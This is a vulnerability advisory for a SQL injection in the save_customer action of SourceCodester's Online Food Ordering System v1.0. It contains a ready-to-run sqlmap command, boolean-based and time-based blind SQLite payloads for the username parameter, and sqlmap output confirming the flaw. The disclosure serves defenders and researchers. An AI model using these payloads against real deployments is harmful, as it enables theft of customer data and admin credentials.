# CVE-2026-XXXX (Pending) - SQL Injection in Online Food Ordering System (Customer Management)

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: Customer Management (`Actions.php?a=save_customer`)
* **Vulnerable Parameter**: `username` (POST)

## Description

A SQL Injection vulnerability exists in **Online Food Ordering System v1.0**. The vulnerability is located in the `Actions.php` file, specifically within the `save_customer` action (used for registering or updating customer details).

The application fails to properly sanitize the `username` parameter in the HTTP POST request before processing it in a SQL query. This allows an authenticated attacker (or a user registering a new account) to inject arbitrary SQL commands. Since the backend database is **SQLite**, attackers can exploit this using Boolean-based inference or Time-based blind injection (utilizing heavy queries like `RANDOMBLOB`) to exfiltrate sensitive data from the database.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login/Access**: Access the Customer Registration or Edit Customer interface in the admin panel.
3. **Capture Request**: Intercept the POST request sent to `Actions.php?a=save_customer` when saving customer details.
4. **Exploit**: Run `sqlmap` against the captured request targeting the `username` parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8088/Actions.php?a=save_customer" \
--data "id=&fullname=John+Doe&email=john%40example.com&contact=1234567890&address=123+Main+Street%2C+Anytown&username=customer1&password=password123" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Referer: http://127.0.0.1:8088/admin/?page=customers" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Boolean-based Blind Payload:**

```sql
username=customer1' AND 4611=4611 AND 'YtZs'='YtZs

```

**Time-based Blind Payload (SQLite):**

```sql
username=customer1' AND 5832=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'Zrsm'='Zrsm

```

## Proof of Concept

The following output from `sqlmap` confirms that the `username` parameter in the `save_customer` action is vulnerable.

```text
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 4611=4611 AND 'YtZs'='YtZs&password=admin123
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username=admin' AND 5832=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'Zrsm'='Zrsm&password=admin123
    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)
---
[INFO] the back-end DBMS is SQLite

```

<img width="1062" height="326" alt="图片" src="https://github.com/user-attachments/assets/f2d28a59-dd69-4544-8cba-fe82e6f55083" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Dump the entire SQLite database, including customer PII (Personal Identifiable Information), admin credentials, and order details.
2. **Authentication Bypass**: Potentially manipulate login logic.
3. **Database Enumeration**: Identify database schema and tables.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
